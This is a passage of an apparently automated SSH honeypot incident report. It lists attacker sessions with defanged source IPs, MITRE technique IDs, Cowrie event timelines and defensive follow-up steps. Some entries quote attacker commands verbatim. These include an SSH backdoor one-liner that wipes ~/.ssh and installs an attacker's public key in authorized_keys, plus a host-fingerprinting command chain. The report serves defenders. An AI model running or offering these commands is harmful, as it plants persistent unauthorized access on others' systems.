| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:43:58` | `cowrie.session.connect` |
| `2026-07-09 20:43:58` | `cowrie.client.version` |
| `2026-07-09 20:43:58` | `cowrie.client.kex` |
| `2026-07-09 20:44:00` | `cowrie.login.success` |
| `2026-07-09 20:44:00` | `cowrie.session.params` |
| `2026-07-09 20:44:00` | `cowrie.command.input` |
| `2026-07-09 20:44:00` | `cowrie.command.failed` |
| `2026-07-09 20:44:01` | `cowrie.log.closed` |
| `2026-07-09 20:44:02` | `cowrie.session.params` |
| `2026-07-09 20:44:02` | `cowrie.command.input` |
| `2026-07-09 20:44:02` | `cowrie.session.file_download` |
| `2026-07-09 20:44:02` | `cowrie.log.closed` |
| `2026-07-09 20:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.45[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.45[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d776fd6dcc21

| Field | Detail |
|---|---|
| **Source IP** | `139.59.45[.]165` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:02` | `cowrie.session.connect` |
| `2026-07-09 20:44:02` | `cowrie.client.version` |
| `2026-07-09 20:44:02` | `cowrie.client.kex` |
| `2026-07-09 20:44:03` | `cowrie.login.success` |
| `2026-07-09 20:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.45[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.45[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e10158d2a76

| Field | Detail |
|---|---|
| **Source IP** | `139.59.45[.]165` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:04` | `cowrie.session.connect` |
| `2026-07-09 20:44:04` | `cowrie.client.version` |
| `2026-07-09 20:44:04` | `cowrie.client.kex` |
| `2026-07-09 20:44:05` | `cowrie.login.success` |
| `2026-07-09 20:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.45[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.45[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72fdfcdab96

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:31` | `cowrie.session.connect` |
| `2026-07-09 20:44:31` | `cowrie.client.version` |
| `2026-07-09 20:44:31` | `cowrie.client.kex` |
| `2026-07-09 20:44:31` | `cowrie.login.success` |
| `2026-07-09 20:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4611bd155387

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:32` | `cowrie.session.connect` |
| `2026-07-09 20:44:32` | `cowrie.client.version` |
| `2026-07-09 20:44:32` | `cowrie.client.kex` |
| `2026-07-09 20:44:32` | `cowrie.login.success` |
| `2026-07-09 20:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f494558c022

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:36` | `cowrie.session.connect` |
| `2026-07-09 20:44:36` | `cowrie.client.version` |
| `2026-07-09 20:44:36` | `cowrie.client.kex` |
| `2026-07-09 20:44:37` | `cowrie.login.success` |
| `2026-07-09 20:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f9ddf787fa

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 20:44 |
| **Last Seen** | 2026-07-09 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:44:37` | `cowrie.session.connect` |
| `2026-07-09 20:44:37` | `cowrie.client.version` |
| `2026-07-09 20:44:37` | `cowrie.client.kex` |
| `2026-07-09 20:44:37` | `cowrie.login.success` |
| `2026-07-09 20:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c468392560

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:11` | `cowrie.session.connect` |
| `2026-07-09 20:45:11` | `cowrie.client.version` |
| `2026-07-09 20:45:11` | `cowrie.client.kex` |
| `2026-07-09 20:45:12` | `cowrie.login.success` |
| `2026-07-09 20:45:12` | `cowrie.session.params` |
| `2026-07-09 20:45:12` | `cowrie.command.input` |
| `2026-07-09 20:45:12` | `cowrie.command.failed` |
| `2026-07-09 20:45:13` | `cowrie.log.closed` |
| `2026-07-09 20:45:14` | `cowrie.session.params` |
| `2026-07-09 20:45:14` | `cowrie.command.input` |
| `2026-07-09 20:45:14` | `cowrie.session.file_download` |
| `2026-07-09 20:45:14` | `cowrie.log.closed` |
| `2026-07-09 20:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15f5c5e85a2

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:14` | `cowrie.session.connect` |
| `2026-07-09 20:45:14` | `cowrie.client.version` |
| `2026-07-09 20:45:14` | `cowrie.client.kex` |
| `2026-07-09 20:45:15` | `cowrie.login.success` |
| `2026-07-09 20:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeca437e6ef1

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:15` | `cowrie.session.connect` |
| `2026-07-09 20:45:15` | `cowrie.client.version` |
| `2026-07-09 20:45:15` | `cowrie.client.kex` |
| `2026-07-09 20:45:16` | `cowrie.login.success` |
| `2026-07-09 20:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed964b529f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:22` | `cowrie.session.connect` |
| `2026-07-09 20:45:22` | `cowrie.client.version` |
| `2026-07-09 20:45:22` | `cowrie.client.kex` |
| `2026-07-09 20:45:23` | `cowrie.login.success` |
| `2026-07-09 20:45:24` | `cowrie.session.params` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.success` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.command.input` |
| `2026-07-09 20:45:24` | `cowrie.log.closed` |
| `2026-07-09 20:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c203c1f678

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:36` | `cowrie.session.connect` |
| `2026-07-09 20:45:36` | `cowrie.client.version` |
| `2026-07-09 20:45:36` | `cowrie.client.kex` |
| `2026-07-09 20:45:39` | `cowrie.login.success` |
| `2026-07-09 20:45:39` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99a56d5cd08

| Field | Detail |
|---|---|
| **Source IP** | `41.231.85[.]75` |
| **First Seen** | 2026-07-09 20:45 |
| **Last Seen** | 2026-07-09 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:45:45` | `cowrie.session.connect` |
| `2026-07-09 20:45:46` | `cowrie.client.version` |
| `2026-07-09 20:45:46` | `cowrie.client.kex` |
| `2026-07-09 20:45:48` | `cowrie.login.success` |
| `2026-07-09 20:45:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.231.85[.]75` to AbuseIPDB if not already reported
- [ ] Block `41.231.85[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38d3e2b6d4d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:46 |
| **Last Seen** | 2026-07-09 20:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:46:44` | `cowrie.session.connect` |
| `2026-07-09 20:46:44` | `cowrie.client.version` |
| `2026-07-09 20:46:45` | `cowrie.client.kex` |
| `2026-07-09 20:46:45` | `cowrie.login.success` |
| `2026-07-09 20:46:46` | `cowrie.session.params` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.success` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.command.input` |
| `2026-07-09 20:46:46` | `cowrie.log.closed` |
| `2026-07-09 20:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfbefc9a623

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:48 |
| **Last Seen** | 2026-07-09 20:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:48:07` | `cowrie.session.connect` |
| `2026-07-09 20:48:07` | `cowrie.client.version` |
| `2026-07-09 20:48:08` | `cowrie.client.kex` |
| `2026-07-09 20:48:08` | `cowrie.login.success` |
| `2026-07-09 20:48:09` | `cowrie.session.params` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.success` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.command.input` |
| `2026-07-09 20:48:09` | `cowrie.log.closed` |
| `2026-07-09 20:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb07e0f706b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:49 |
| **Last Seen** | 2026-07-09 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:49:34` | `cowrie.session.connect` |
| `2026-07-09 20:49:34` | `cowrie.client.version` |
| `2026-07-09 20:49:34` | `cowrie.client.kex` |
| `2026-07-09 20:49:35` | `cowrie.login.success` |
| `2026-07-09 20:49:35` | `cowrie.session.params` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.success` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:35` | `cowrie.command.input` |
| `2026-07-09 20:49:36` | `cowrie.command.input` |
| `2026-07-09 20:49:36` | `cowrie.command.input` |
| `2026-07-09 20:49:36` | `cowrie.log.closed` |
| `2026-07-09 20:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f776869c8aef

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 20:49 |
| **Last Seen** | 2026-07-09 20:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:49:45` | `cowrie.session.connect` |
| `2026-07-09 20:49:46` | `cowrie.client.version` |
| `2026-07-09 20:49:46` | `cowrie.client.kex` |
| `2026-07-09 20:49:49` | `cowrie.login.success` |
| `2026-07-09 20:49:52` | `cowrie.session.params` |
| `2026-07-09 20:49:52` | `cowrie.command.input` |
| `2026-07-09 20:49:54` | `cowrie.log.closed` |
| `2026-07-09 20:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c18ea1397c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:51 |
| **Last Seen** | 2026-07-09 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:51:00` | `cowrie.session.connect` |
| `2026-07-09 20:51:00` | `cowrie.client.version` |
| `2026-07-09 20:51:01` | `cowrie.client.kex` |
| `2026-07-09 20:51:01` | `cowrie.login.success` |
| `2026-07-09 20:51:02` | `cowrie.session.params` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.success` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.command.input` |
| `2026-07-09 20:51:02` | `cowrie.log.closed` |
| `2026-07-09 20:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d035030e5b3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 20:52 |
| **Last Seen** | 2026-07-09 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:52:10` | `cowrie.session.connect` |
| `2026-07-09 20:52:10` | `cowrie.client.version` |
| `2026-07-09 20:52:10` | `cowrie.client.kex` |
| `2026-07-09 20:52:12` | `cowrie.login.success` |
| `2026-07-09 20:52:13` | `cowrie.session.params` |
| `2026-07-09 20:52:13` | `cowrie.command.input` |
| `2026-07-09 20:52:14` | `cowrie.log.closed` |
| `2026-07-09 20:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb6340b48daa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:52 |
| **Last Seen** | 2026-07-09 20:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
